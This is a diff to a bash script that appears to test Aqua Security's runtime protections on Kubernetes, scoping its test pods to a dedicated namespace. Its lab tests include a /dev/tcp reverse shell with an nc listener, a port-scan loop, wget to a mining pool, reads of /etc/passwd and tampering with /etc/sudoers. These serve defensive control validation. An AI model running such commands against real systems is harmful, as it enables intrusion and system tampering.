@@ -56,6 +56,7 @@ print_help() {
 handle_flags() {
   export AQUA_PROBE_IMAGE="ericgomes56/aqua-probe:1.0"
   export AQUA_PROBE_NAMESPACE="aqua"
+  export AQUA_PROBE_TEST_NAMESPACE="aqua-probe-lab"
 
   while [[ $# -gt 0 ]]; do  # Loop until all arguments are processed
     case "$1" in
@@ -216,13 +217,17 @@ check_aqua_kube_enforcer_deployment() {
 
 check_container_existence() {
     # Check if the aqua-test-container deployment already exists
-    kubectl get deployment aqua-test-container >/dev/null 2>&1
+    kubectl get deployment aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1
     return $?
 }
 
 check_pod_status() {
     local pod_name=$1
-    kubectl get pods | grep $pod_name | grep -q "Running"
+    kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" | grep $pod_name | grep -q "Running"
+}
+
+ensure_test_namespace() {
+    kubectl create namespace "$AQUA_PROBE_TEST_NAMESPACE" --dry-run=client -o yaml | kubectl apply -f -
 }
 
 deploy_test_container() {
@@ -234,8 +239,9 @@ deploy_test_container() {
 
     echo
     print_colored_message yellow "Deploying Aqua test container..."
+    ensure_test_namespace
     # Deploying the container using kubectl
-    kubectl apply -f - <<EOF
+    kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -263,7 +269,7 @@ EOF
     # Wait for the deployment to complete
     echo
     print_colored_message yellow "Waiting for the deployment to complete..."
-    kubectl wait --for=condition=available deployment/aqua-test-container --timeout=60s
+    kubectl wait --for=condition=available deployment/aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=60s
 
     # Check if deployment was successful
     if [ $? -eq 0 ]; then
@@ -278,19 +284,19 @@ EOF
 
 delete_test_container() {
     echo "Deleting Aqua test container..."
-    kubectl delete deployment aqua-test-container --ignore-not-found
+    kubectl delete deployment aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
 }
 
 check_listener_container_existence() {
     # Check if the listener container exists
-    kubectl get pod listener >/dev/null 2>&1
+    kubectl get pod listener -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1
     return $?
 }
 
 delete_listener_container() {
     if check_listener_container_existence; then
         echo "Deleting listener container..."
-        kubectl delete pod listener --force --ignore-not-found
+        kubectl delete pod listener -n "$AQUA_PROBE_TEST_NAMESPACE" --force --ignore-not-found
     fi
 }
 
@@ -307,9 +313,9 @@ cleanup_aqua_probe_artifacts() {
     echo
     print_colored_message yellow "Cleaning up Aqua Probe Kubernetes test artifacts..."
 
-    kubectl delete deployment "${test_deployments[@]}" --ignore-not-found
-    kubectl delete pod "${standalone_test_pods[@]}" --force --ignore-not-found
-    kubectl delete pod "${privilege_test_pods[@]}" --ignore-not-found
+    kubectl delete deployment "${test_deployments[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
+    kubectl delete pod "${standalone_test_pods[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --force --ignore-not-found
+    kubectl delete pod "${privilege_test_pods[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
 
     cleanup_non_compliant_resources_lab
 
@@ -325,11 +331,11 @@ apply_non_compliant_resource() {
 
     echo
     print_colored_message yellow "Applying non-compliant resource: $resource_name"
-    kubectl apply -f -
+    kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f -
 }
 
 cleanup_non_compliant_resources_lab() {
-    local lab_namespace="aqua-controls-lab"
+    local lab_namespace="$AQUA_PROBE_TEST_NAMESPACE"
     local lab_pods=(
         host-ipc-bad host-pid-bad host-network-bad host-port-bad
         non-compliant-image-domain-bad cpu-limit-missing-bad cpu-request-missing-bad
@@ -340,7 +346,7 @@ cleanup_non_compliant_resources_lab() {
         runs-as-root-bad low-gid-bad low-uid-bad apparmor-unconfined-bad
         seccomp-unconfined-bad selinux-custom-bad sys-admin-bad sys-module-bad
         specific-capability-bad unsafe-sysctl-bad docker-sock-hostpath-bad
-        hostpath-volume-bad
+        hostpath-volume-bad default-namespace-bad
     )
     local lab_configmaps=(configmap-secret-bad configmap-sensitive-bad)
     local lab_services=(external-ip-bad)
@@ -363,7 +369,6 @@ cleanup_non_compliant_resources_lab() {
         kubectl delete service "${lab_services[@]}" -n "$lab_namespace" --ignore-not-found
         kubectl delete role "${lab_roles[@]}" -n "$lab_namespace" --ignore-not-found
     fi
-    kubectl delete pod default-namespace-bad -n default --ignore-not-found
     kubectl delete clusterrolebinding "${cluster_role_bindings[@]}" --ignore-not-found
     kubectl delete clusterrole "${cluster_roles[@]}" --ignore-not-found
     kubectl delete namespace "$lab_namespace" --ignore-not-found --wait=false
@@ -399,19 +404,19 @@ test_realtime_malware_protection() {
   case $prerequisites_met in
     [Yy]*)
       if check_container_existence; then
-        pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-        container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+        pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+        container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
         echo
         print_colored_message yellow "Executing 'ls -la' command in the container..."
         echo
-        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
+        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
         sleep 1.5
 
         # Create the eicar.txt file and write the concatenated string
         echo
         print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
         echo
-        kubectl exec -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
+        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
         if [ $? -eq 0 ]; then
           echo
           print_colored_message yellow "Eicar string written to file successfully."
@@ -426,7 +431,7 @@ test_realtime_malware_protection() {
         echo
         print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
         echo
-        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
+        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
         echo
         print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
 
@@ -464,18 +469,18 @@ test_drift_prevention() {
         [Yy]*)
             # Make a copy of /bin/ls and execute the copy
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
                 echo
-                echo "kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
-                kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
+                echo "kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
                 echo
                 print_colored_message yellow "Executing '/tmp/wget_copy' command in the container..."
                 echo
-                echo "kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
-                kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com
+                echo "kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- /tmp/wget_copy google.com
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -513,12 +518,12 @@ test_block_cryptocurrency_mining() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -556,12 +561,12 @@ test_block_fileless_execution() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing './memrun MASTER_HACKER_PROCESS_NAME_1337 target' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- ./tmp/memrun MASTER_HACKER_PROCESS_NAME_1337 /tmp/target
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ./tmp/memrun MASTER_HACKER_PROCESS_NAME_1337 /tmp/target
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
                 print_colored_message green "[✓] Please login to the Aqua Console and click on the Security Reports -> Audit page to review the security incident."
@@ -601,7 +606,8 @@ test_reverse_shell() {
                 # Create a listener pod with nc listener
                 echo
                 print_colored_message yellow "Creating listener pod"
-                kubectl apply -f - <<EOF
+                ensure_test_namespace
+                kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -620,22 +626,22 @@ spec:
 EOF
                 echo
                 print_colored_message yellow "Waiting for the listener container pod to start running..."
-                while ! kubectl get pods | grep listener | grep -q "Running"; do
+                while ! kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" | grep listener | grep -q "Running"; do
                     sleep 5
                 done
                 echo
                 print_colored_message yellow "Listener container pod is running. Configuring nc listener in pod..."
                 echo
-                kubectl exec listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                 echo
                 print_colored_message yellow "Retrieving IP address..."
-                listener_pod_ip=$(kubectl get pods -o wide | grep listener | awk '{print $6}')
+                listener_pod_ip=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -o wide | grep listener | awk '{print $6}')
                 echo "$listener_pod_ip"
                 echo
                 print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
                 echo
-                aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
+                aqua_test_container=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                 echo
@@ -673,14 +679,14 @@ test_executables_blocked() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing the blocked 'ps' command in the container..."
                 echo
-                echo "kubectl exec -it $pod_name --container $container_name -- bash -c ps"
+                echo "kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c ps"
                 echo
-                kubectl exec -it $pod_name --container $container_name -- bash -c "ps"
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "ps"
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -717,11 +723,11 @@ test_block_container_exec() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo "Executing shell session in the Aqua test application container..."
                 echo
-        kubectl exec -it $pod_name --container $container_name -- bash
+        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -759,12 +765,12 @@ test_bad_dns_ip_reputation() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing 'curl https://68.183.212.246' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- curl https://68.183.212.246
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- curl https://68.183.212.246
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -803,12 +809,12 @@ test_file_block() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing 'cat /etc/passwd' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- cat /etc/passwd
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cat /etc/passwd
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -847,12 +853,12 @@ test_package_block() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing 'tar' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- tar
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- tar
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -890,13 +896,13 @@ test_port_scanning_detection() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing port scan command in the container..."
                 echo
                 echo 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
-                kubectl exec -it $pod_name --container $container_name -- bash -c 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -935,8 +941,9 @@ test_block_non_compliant_images() {
             echo
             print_colored_message yellow "Deploying non-compliant image test container..."
             echo
-            kubectl delete deployment aqua-non-compliant-image-test --ignore-not-found
-            kubectl apply -f - <<EOF
+            ensure_test_namespace
+            kubectl delete deployment aqua-non-compliant-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -1002,8 +1009,9 @@ test_block_unregistered_images() {
             echo
             print_colored_message yellow "Deploying unregistered image test container with image: $unregistered_image"
             echo
-            kubectl delete deployment aqua-unregistered-image-test --ignore-not-found
-            kubectl apply -f - <<EOF
+            ensure_test_namespace
+            kubectl delete deployment aqua-unregistered-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -1062,8 +1070,8 @@ test_file_integrity_monitoring() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing File Integrity Monitoring create, modify, permission change, and delete actions in the container..."
                 echo
@@ -1081,19 +1089,19 @@ chmod 777 /etc/sudoers
 rm /etc/sudoers
 EOF
                 print_colored_message yellow "Preparing baseline '/etc/sudoers' file..."
-                kubectl exec -it $pod_name --container $container_name -- bash -c 'touch /etc/sudoers'
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'touch /etc/sudoers'
 
                 print_colored_message yellow "Creating '/etc/backdoor.conf'..."
-                kubectl exec -it $pod_name --container $container_name -- bash -c 'echo "malicious change" > /etc/backdoor.conf'
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "malicious change" > /etc/backdoor.conf'
 
                 print_colored_message yellow "Modifying '/etc/sudoers'..."
-                kubectl exec -it $pod_name --container $container_name -- bash -c 'echo "debug=true" >> /etc/sudoers'
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "debug=true" >> /etc/sudoers'
 
                 print_colored_message yellow "Changing permissions on '/etc/sudoers'..."
-                kubectl exec -it $pod_name --container $container_name -- chmod 777 /etc/sudoers
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- chmod 777 /etc/sudoers
 
                 print_colored_message yellow "Deleting '/etc/sudoers'..."
-                kubectl exec -it $pod_name --container $container_name -- rm /etc/sudoers
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- rm /etc/sudoers
                 echo
                 print_colored_message yellow "[!] Observe that file create, modify, permission change, or delete activity was detected by Aqua."
                 echo
@@ -1131,12 +1139,12 @@ test_system_integrity_monitoring() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 print_colored_message yellow "Executing 'date +%T -s \"10:00:00\"' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- date +%T -s "10:00:00"
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- date +%T -s "10:00:00"
                 echo
                 print_colored_message yellow "[!] Observe that system time change activity was detected by Aqua."
                 echo
@@ -1174,11 +1182,12 @@ test_limit_container_privileges() {
         [Yy]*)
             echo
             print_colored_message yellow "Cleaning up previous Limit Container Privileges test pods..."
-            kubectl delete pod host-network-test cap-add-test root-user-test privileged-test host-ipc-test host-pid-test host-userns-test host-uts-test --ignore-not-found
+            ensure_test_namespace
+            kubectl delete pod host-network-test cap-add-test root-user-test privileged-test host-ipc-test host-pid-test host-userns-test host-uts-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
 
             echo
             print_colored_message yellow "1. Access to host network - blocked by hostNetwork: true"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1191,11 +1200,11 @@ spec:
     imagePullPolicy: Always
     command: ["sleep","3600"]
 EOF
-            echo "Verify: kubectl get pod host-network-test -o yaml | grep hostNetwork"
+            echo "Verify: kubectl get pod host-network-test -n $AQUA_PROBE_TEST_NAMESPACE -o yaml | grep hostNetwork"
 
             echo
             print_colored_message yellow "2. Adding capabilities with --cap-add - blocked by extra Linux capabilities"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1216,7 +1225,7 @@ EOF
 
             echo
             print_colored_message yellow "3. Configured with root user - blocked by running as UID 0"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1235,7 +1244,7 @@ EOF
 
             echo
             print_colored_message yellow "4. Privileged containers - blocked by privileged mode"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1253,7 +1262,7 @@ EOF
 
             echo
             print_colored_message yellow "5. Use the host IPC namespace - blocked by hostIPC: true"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1270,7 +1279,7 @@ EOF
 
             echo
             print_colored_message yellow "6. Use the host PID namespace - blocked by hostPID: true"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1287,7 +1296,7 @@ EOF
 
             echo
             print_colored_message yellow "7. Use the host user namespace - blocked by hostUsers: true"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1304,7 +1313,7 @@ EOF
 
             echo
             print_colored_message yellow "8. Use the host UTS namespace - blocked by hostNetwork or sharing UTS namespace"
-            kubectl apply -f - <<EOF
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1400,8 +1409,8 @@ test_port_block() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
                 read -p "Enter target host or IP [default: $default_host]: " port_block_host
                 if [ -z "$port_block_host" ]; then
@@ -1416,7 +1425,7 @@ test_port_block() {
                 print_colored_message yellow "Executing TCP connection test to $port_block_host:$port_block_port in the container..."
                 echo
                 echo "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
-                kubectl exec -it $pod_name --container $container_name -- bash -c "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
+                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because the destination port has been blocked by Aqua."
                 echo
@@ -1471,8 +1480,9 @@ test_volumes_blocked() {
             echo
             print_colored_message yellow "Deploying volume block test pod with hostPath '$blocked_host_path' mounted at '$blocked_mount_path'..."
             echo
-            kubectl delete pod volume-block-test --ignore-not-found
-            kubectl apply -f - <<EOF
+            ensure_test_namespace
+            kubectl delete pod volume-block-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
+            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1494,7 +1504,7 @@ spec:
       type: Directory
 EOF
             echo
-            echo "Verify: kubectl get pod volume-block-test -o yaml | grep -A5 hostPath"
+            echo "Verify: kubectl get pod volume-block-test -n $AQUA_PROBE_TEST_NAMESPACE -o yaml | grep -A5 hostPath"
             echo
             print_colored_message yellow "[!] Observe that the pod creation is blocked because it requests a blocked hostPath volume."
             echo
@@ -1512,7 +1522,7 @@ EOF
 
 # Block Non-compliant Resources
 test_block_non_compliant_resources() {
-    local lab_namespace="aqua-controls-lab"
+    local lab_namespace="$AQUA_PROBE_TEST_NAMESPACE"
 
     if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
         prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
@@ -2154,7 +2164,7 @@ apiVersion: v1
 kind: Pod
 metadata:
   name: default-namespace-bad
-  namespace: default
+  namespace: $lab_namespace
 spec:
   containers:
   - name: app
